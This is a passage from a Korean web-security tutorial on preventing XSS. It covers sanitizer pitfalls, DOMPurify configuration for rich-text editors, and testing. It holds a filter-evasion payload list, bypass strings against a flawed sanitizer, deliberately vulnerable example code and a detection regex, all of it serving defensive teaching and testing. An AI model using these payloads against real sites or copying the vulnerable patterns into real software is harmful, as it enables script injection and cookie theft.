// → <img src=x onerror=alert(1)>  (속성 앞에 on 제거 안됨)

badSanitize('<img src=x ONError=alert(1)>');
// → <img src=x ONError=alert(1)>  (대소문자)

badSanitize('<a href="jAvAsCrIpT:alert(1)">');
// → <a href="jAvAsCrIpT:alert(1)">  (대소문자)

badSanitize('<img src=x one\x00rror=alert(1)>');
// → null byte 우회

// ✅ 화이트리스트 사용
function goodSanitize(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong'],
    ALLOWED_ATTR: []
  });
}
```

### 함정 3: innerHTML의 숨겨진 위험

```javascript
// ❌ 이런 코드도 위험합니다
element.innerHTML = '';  // 초기화
element.innerHTML += userInput;  // 추가

// ✅ 더 안전한 방법
while (element.firstChild) {
  element.removeChild(element.firstChild);
}
element.textContent = userInput;

// 또는
element.replaceChildren();  // 모던 브라우저
element.textContent = userInput;
```

### 함정 4: URL 검증 누락

```javascript
// ❌ 위험한 URL 처리
function createLink(url, text) {
  return `<a href="${url}">${text}</a>`;
}

// 공격:
createLink('javascript:alert("XSS")', '클릭');
createLink('data:text/html,<script>alert("XSS")</script>', '클릭');
createLink('vbscript:msgbox("XSS")', '클릭');  // IE

// ✅ URL 프로토콜 검증
function createSafeLink(url, text) {
  try {
    const urlObj = new URL(url);
    const allowedProtocols = ['http:', 'https:', 'mailto:'];

    if (!allowedProtocols.includes(urlObj.protocol)) {
      return `<span>${text}</span>`;
    }

    return `<a href="${url}" rel="noopener noreferrer">${text}</a>`;
  } catch {
    // 잘못된 URL
    return `<span>${text}</span>`;
  }
}
```

### 함정 5: 이중 디코딩 공격

```javascript
// ❌ 취약한 디코딩
app.get('/search', (req, res) => {
  let query = decodeURIComponent(req.query.q);
  query = decodeURIComponent(query);  // 이중 디코딩!
  res.send(`<h1>${query}</h1>`);
});

// 공격: %253Cscript%253Ealert(1)%253C/script%253E
// 1차 디코딩: %3Cscript%3Ealert(1)%3C/script%3E
// 2차 디코딩: <script>alert(1)</script>  ← XSS 성공

// ✅ 한 번만 디코딩 (Express가 자동으로 해줌)
app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);  // 이미 디코딩됨
  res.send(`<h1>${query}</h1>`);
});
```

### 함정 6: 템플릿 인젝션

```javascript
// ❌ 템플릿 리터럴에 사용자 입력 직접 사용
const userTemplate = req.body.template;
const result = eval(`\`${userTemplate}\``);  // 매우 위험!

// 공격: ${process.exit()}

// ✅ 템플릿 엔진 사용 (Handlebars, EJS 등)
const Handlebars = require('handlebars');
const template = Handlebars.compile('Hello {{name}}!');
const result = template({ name: userInput });  // 자동 이스케이핑
```

### 함정 7: DOM Clobbering

```html
<!-- 공격자가 삽입한 HTML -->
<form id="userForm"></form>
<form name="userForm"></form>

<script>
// 개발자가 작성한 코드
if (window.userForm) {
  // userForm을 HTMLFormElement라고 가정
  userForm.submit();  // 에러 또는 예상치 못한 동작
}
</script>
```

```javascript
// ✅ 방어: DOM Clobbering 방지
function sanitizeWithDOMCheck(html) {
  return DOMPurify.sanitize(html, {
    SANITIZE_DOM: true,  // DOM Clobbering 방지
    KEEP_CONTENT: false
  });
}
```

## 실전 활용: 리치 텍스트 에디터

### Quill.js와 함께 사용

```javascript
import Quill from 'quill';
import DOMPurify from 'dompurify';

// Quill 초기화
const quill = new Quill('#editor', {
  theme: 'snow',
  modules: {
    toolbar: [
      ['bold', 'italic', 'underline'],
      ['link', 'image'],
      [{ 'list': 'ordered'}, { 'list': 'bullet' }]
    ]
  }
});

// 저장 시 새니타이징
function saveContent() {
  const html = quill.root.innerHTML;
  const cleaned = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'u',
      'ol', 'ul', 'li',
      'a', 'img'
    ],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'class']
  });

  fetch('/api/content', {
    method: 'POST',
    body: JSON.stringify({ content: cleaned })
  });
}

// 불러올 때도 새니타이징
async function loadContent() {
  const response = await fetch('/api/content/123');
  const data = await response.json();

  // 서버에서 온 데이터도 신뢰하지 않기
  const cleaned = DOMPurify.sanitize(data.content);
  quill.root.innerHTML = cleaned;
}
```

### TinyMCE 보안 설정

```javascript
import tinymce from 'tinymce';

tinymce.init({
  selector: '#editor',
  plugins: 'link image code',

  // 보안 설정
  allow_script_urls: false,  // javascript: URL 차단
  convert_urls: true,  // 상대 URL을 절대 URL로

  // 허용할 요소 정의
  valid_elements:
    'p,br,strong/b,em/i,u,' +
    'a[href|title|target],' +
    'img[src|alt|width|height],' +
    'ul,ol,li,' +
    'h1,h2,h3',

  // 확장 valid_elements
  extended_valid_elements: '',

  // 저장 전 처리
  setup: function(editor) {
    editor.on('submit', function() {
      const content = editor.getContent();
      const cleaned = DOMPurify.sanitize(content);
      editor.setContent(cleaned);
    });
  }
});
```

### 마크다운 에디터 구현

```jsx
import React, { useState, useMemo } from 'react';
import { marked } from 'marked';
import DOMPurify from 'dompurify';

function MarkdownEditor() {
  const [markdown, setMarkdown] = useState('');

  // 마크다운 렌더링 옵션
  marked.setOptions({
    breaks: true,  // 줄바꿈 허용
    gfm: true,  // GitHub Flavored Markdown
    sanitize: false,  // DOMPurify로 직접 처리
  });

  // 미리보기 HTML
  const previewHtml = useMemo(() => {
    const rawHtml = marked.parse(markdown);
    return DOMPurify.sanitize(rawHtml, {
      ALLOWED_TAGS: [
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'p', 'br', 'hr',
        'strong', 'em', 'del', 'code', 'pre',
        'ul', 'ol', 'li',
        'blockquote',
        'a', 'img',
        'table', 'thead', 'tbody', 'tr', 'th', 'td'
      ],
      ALLOWED_ATTR: {
        'a': ['href', 'title'],
        'img': ['src', 'alt', 'title'],
        'code': ['class'],  // 언어 하이라이팅용
        '*': ['id']  // 헤딩 앵커용
      },
      ALLOW_DATA_ATTR: false,
      // 링크 처리
      ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i
    });
  }, [markdown]);

  return (
    <div className="markdown-editor">
      <textarea
        value={markdown}
        onChange={(e) => setMarkdown(e.target.value)}
        placeholder="마크다운을 입력하세요..."
      />
      <div
        className="preview"
        dangerouslySetInnerHTML={{ __html: previewHtml }}
      />
    </div>
  );
}
```

## 테스트: XSS 취약점 찾기

### XSS 페이로드 모음

```javascript
const xssPayloads = [
  // 기본 스크립트
  '<script>alert("XSS")</script>',
  '<script>alert(document.cookie)</script>',

  // 이미지 태그
  '<img src=x onerror=alert("XSS")>',
  '<img src="javascript:alert(\'XSS\')">',
  '<img src=x onerror="&#97;lert(1)">',  // HTML entity

  // SVG
  '<svg onload=alert("XSS")>',
  '<svg><script>alert("XSS")</script></svg>',

  // 이벤트 핸들러
  '<body onload=alert("XSS")>',
  '<div onmouseover=alert("XSS")>hover me</div>',

  // 링크
  '<a href="javascript:alert(\'XSS\')">click</a>',
  '<a href="data:text/html,<script>alert(\'XSS\')</script>">click</a>',

  // iframe
  '<iframe src="javascript:alert(\'XSS\')">',

  // 대소문자 우회
  '<ScRiPt>alert("XSS")</sCrIpT>',
  '<IMG SRC=x OnErRoR=alert("XSS")>',

  // 인코딩 우회
  '<img src=x onerror="&#x61;lert(1)">',
  '<img src=x onerror="\\u0061lert(1)">',

  // HTML5 공격
  '<video src=x onerror=alert("XSS")>',
  '<audio src=x onerror=alert("XSS")>',

  // 특수 문자
  '"><script>alert("XSS")</script>',
  '\';alert(String.fromCharCode(88,83,83));//',

  // UTF-7 (구형 IE)
  '+ADw-script+AD4-alert(\'XSS\')+ADw-/script+AD4-',

  // NULL byte
  '<img src=x onerror\x00=alert("XSS")>',
];

// 자동 테스트
function testXSS(sanitizeFunction) {
  const results = [];

  xssPayloads.forEach(payload => {
    const result = sanitizeFunction(payload);
    const isSafe = !/<script|onerror|onload|javascript:/i.test(result);

    results.push({
      payload,
      result,
      isSafe,
      passed: isSafe
    });
  });

  const passed = results.filter(r => r.passed).length;
  const total = results.length;

  console.log(`Test Results: ${passed}/${total} passed`);

  results.filter(r => !r.passed).forEach(r => {
    console.error('FAILED:', r.payload, '→', r.result);
  });

  return results;
}

// 사용
testXSS(userInput => DOMPurify.sanitize(userInput));
```

### 통합 테스트

```javascript
// Jest 테스트 예시
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

describe('XSS Protection', () => {
  let purify;

  beforeAll(() => {
    const window = new JSDOM('').window;
    purify = DOMPurify(window);
  });

  test('should remove script tags', () => {
    const dirty = '<p>Hello</p><script>alert("XSS")</script>';
    const clean = purify.sanitize(dirty);
    expect(clean).toBe('<p>Hello</p>');
    expect(clean).not.toContain('<script>');
  });

  test('should remove event handlers', () => {
    const dirty = '<img src=x onerror=alert("XSS")>';
    const clean = purify.sanitize(dirty);
    expect(clean).not.toContain('onerror');
  });

  test('should remove javascript: URLs', () => {
    const dirty = '<a href="javascript:alert(\'XSS\')">link</a>';
    const clean = purify.sanitize(dirty);
    expect(clean).not.toContain('javascript:');
  });

  test('should allow safe HTML', () => {
    const safe = '<p><strong>Bold</strong> and <em>italic</em></p>';
    const clean = purify.sanitize(safe);
    expect(clean).toContain('<strong>');
    expect(clean).toContain('<em>');
  });

  test('should handle nested attacks', () => {
    const dirty = '<p><<script>alert("XSS")<</script>/p>';
    const clean = purify.sanitize(dirty);
    expect(clean).not.toContain('<script>');
  });
});
```

### 브라우저에서 수동 테스트

```html
<!DOCTYPE html>
<html>
<head>
  <title>XSS Test Page</title>
  <script src="https://cdn.jsdelivr.net/npm/dompurify@3/dist/purify.min.js"></script>
</head>
<body>
  <h1>XSS Sanitization Tester</h1>

  <textarea id="input" rows="10" cols="80" placeholder="Enter potentially malicious HTML..."></textarea>
  <br>
  <button onclick="test()">Test Sanitization</button>

  <h2>Result:</h2>
  <div id="output" style="border: 1px solid #ccc; padding: 10px; min-height: 100px;"></div>

  <h2>Raw HTML:</h2>
  <pre id="raw"></pre>

  <script>
    function test() {
      const input = document.getElementById('input').value;
      const output = document.getElementById('output');
      const raw = document.getElementById('raw');

      // 새니타이징
      const cleaned = DOMPurify.sanitize(input, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a', 'img'],
        ALLOWED_ATTR: ['href', 'src', 'alt']
      });

      // 결과 표시
      output.innerHTML = cleaned;
      raw.textContent = cleaned;

      // 콘솔에 경고
      if (input !== cleaned) {
        console.warn('Potentially dangerous content was sanitized');
        console.log('Original:', input);
        console.log('Cleaned:', cleaned);
      }
    }

    // 샘플 페이로드
    const samples = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<a href="javascript:alert(\'XSS\')">link</a>',
    ];

    console.log('Sample payloads:', samples);
  </script>
</body>
</html>
```

## 모던 브라우저: Sanitizer API

브라우저 네이티브 API가 개발 중입니다 (아직 실험적 단계).

```javascript
// ⚠️ 실험적 API - 프로덕션 사용 전 브라우저 지원 확인 필요

if ('Sanitizer' in window) {
  // Sanitizer API 사용 가능
  const sanitizer = new Sanitizer({
    allowElements: ['p', 'br', 'strong', 'em', 'a'],
    allowAttributes: {
      'a': ['href', 'title']
    },
    blockElements: ['script', 'style'],
  });

  // 문자열 새니타이징
  const clean = sanitizer.sanitizeFor('div', userHtml);

  // DOM에 직접 삽입
  element.setHTML(userHtml, { sanitizer });

} else {
  // 폴백: DOMPurify 사용
  import DOMPurify from 'dompurify';
  const clean = DOMPurify.sanitize(userHtml);
  element.innerHTML = clean;
}

// 기능 감지와 폴백을 함께
async function loadSanitizer() {
  if ('Sanitizer' in window) {
    return new Sanitizer();
  } else {
    const DOMPurify = await import('dompurify');
    return {
      sanitize: (html) => DOMPurify.sanitize(html)
    };
  }
}

// 사용
const sanitizer = await loadSanitizer();
const clean = sanitizer.sanitize(userHtml);
```

## Best Practices 체크리스트

### ✅ 개발 단계

- [ ] **모든 사용자 입력을 의심하세요**
  - 폼 입력, URL 파라미터, 쿠키, LocalStorage 등
- [ ] **화이트리스트 방식 사용**
  - 허용할 태그/속성만 명시
- [ ] **textContent를 기본으로, innerHTML은 신중하게**
  - HTML이 필요한 경우만 innerHTML + 새니타이징
- [ ] **URL 프로토콜 검증**
  - javascript:, data:, vbscript: 차단
- [ ] **CSP 헤더 설정**
  - nonce 기반 또는 strict-dynamic

### ✅ 서버 단계

- [ ] **서버에서도 반드시 새니타이징**
  - 클라이언트 검증만 믿지 말기
- [ ] **출력 인코딩 (Output Encoding)**
  - HTML 컨텍스트: &lt; &gt; &amp; &quot;
  - JavaScript 컨텍스트: \x3c \x3e
  - URL 컨텍스트: %3C %3E
- [ ] **적절한 Content-Type 헤더**
  - text/html; charset=UTF-8
- [ ] **X-Content-Type-Options: nosniff**
  - MIME 타입 스니핑 방지

### ✅ 프레임워크 활용

- [ ] **React**: dangerouslySetInnerHTML 사용 최소화
- [ ] **Vue**: v-html 사용 최소화
- [ ] **Angular**: bypassSecurityTrust* 메서드 신중하게
- [ ] **템플릿 엔진**: 자동 이스케이핑 확인

### ✅ 테스트

- [ ] **XSS 페이로드로 테스트**
  - OWASP XSS Filter Evasion Cheat Sheet 참고
- [ ] **통합 테스트 작성**
  - 새니타이징 로직 테스트
- [ ] **보안 스캔 도구 사용**
  - OWASP ZAP, Burp Suite

### ✅ 모니터링

- [ ] **CSP 위반 보고서 수집**
- [ ] **의심스러운 입력 로깅**
- [ ] **정기적인 보안 감사**

## 참고 자료

### 보안 가이드

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) - XSS 방어의 바이블
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) - 우회 기법 모음
- [Content Security Policy Level 3](https://www.w3.org/TR/CSP3/) - W3C 표준
- [HTML Sanitizer API](https://wicg.github.io/sanitizer-api/) - 브라우저 네이티브 API

### 라이브러리 문서

- [DOMPurify](https://github.com/cure53/DOMPurify) - 가장 인기 있는 새니타이저
- [js-xss](https://github.com/leizongmin/js-xss) - Node.js XSS 필터
- [sanitize-html](https://github.com/apostrophecms/sanitize-html) - 서버/클라이언트 겸용
- [isomorphic-dompurify](https://github.com/kkomelin/isomorphic-dompurify) - SSR 지원

### MDN 문서

- [XSS 공격](https://developer.mozilla.org/ko/docs/Glossary/Cross-site_scripting) - 기본 개념
- [innerHTML](https://developer.mozilla.org/ko/docs/Web/API/Element/innerHTML) - 위험성 설명
- [Content Security Policy](https://developer.mozilla.org/ko/docs/Web/HTTP/CSP) - 상세 가이드
- [TreeWalker](https://developer.mozilla.org/ko/docs/Web/API/TreeWalker) - DOM 순회

### 실전 사례

- [Google Application Security](https://www.google.com/about/appsecurity/) - 대규모 서비스의 보안
- [Facebook Bug Bounty](https://www.facebook.com/whitehat) - 실제 발견된 취약점
- [HackerOne Reports](https://hackerone.com/hacktivity) - XSS 사례 모음

### 도구

- [OWASP ZAP](https://www.zaproxy.org/) - 무료 보안 스캔 도구
- [Burp Suite](https://portswigger.net/burp) - 전문 보안 테스트
- [XSS Hunter](https://xsshunter.com/) - Blind XSS 탐지
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - CSP 정책 검증

### 학습 리소스

- [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting) - 무료 XSS 실습
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - 취약점 학습 플랫폼
- [PentesterLab](https://pentesterlab.com/) - 실전 연습

---

**기억하세요**: XSS 방어는 한 번에 끝나는 게 아닙니다. 새로운 공격 기법이 계속 나오므로 라이브러리를 최신 버전으로 유지하고, 보안 뉴스를 주기적으로 확인하세요. 방어적 프로그래밍(Defensive Programming)을 습관화하고, "사용자 입력은 항상 위험하다"는 마음가짐으로 개발하면 대부분의 XSS 공격을 막을 수 있습니다.
{% endraw %}
